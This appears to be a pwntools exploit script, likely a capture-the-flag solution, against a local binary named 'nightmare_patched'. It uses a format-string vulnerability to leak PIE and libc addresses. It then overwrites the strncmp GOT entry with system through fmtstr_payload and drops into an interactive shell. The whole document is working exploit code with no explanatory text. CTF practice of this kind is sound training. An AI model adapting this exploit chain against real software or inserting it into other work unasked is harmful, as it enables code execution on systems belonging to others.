from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./nightmare_patched")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("127.0.0.1", 1337)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

i = 7

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b">> ", f"%{i}$p".encode())
#print(f"[+] {i} : {io.recvline().decode()}")

leak_pie_address = int(io.recvline().decode().strip(), 16)

elf.address = leak_pie_address - 0x1180

print(f"[+] elf.got.strncmp: {hex(elf.got.strncmp)}")

i = 3 # Libc: _IO_stdfile_1_lock

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b">> ", f"%{i}$p".encode())
#print(f"[+] {i} : {io.recvline().decode()}")

leak_libc_address = int(io.recvline().decode().strip(), 16)

libc.address = leak_libc_address - libc.sym._IO_stdfile_1_lock

print(f"[+] system: {hex(libc.sym.system)}")

offset = 5

writes_dict = {
    elf.got.strncmp: libc.sym.system
}

payload = fmtstr_payload(offset, writes_dict, write_size='short')

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b">> ", payload)

io.interactive()
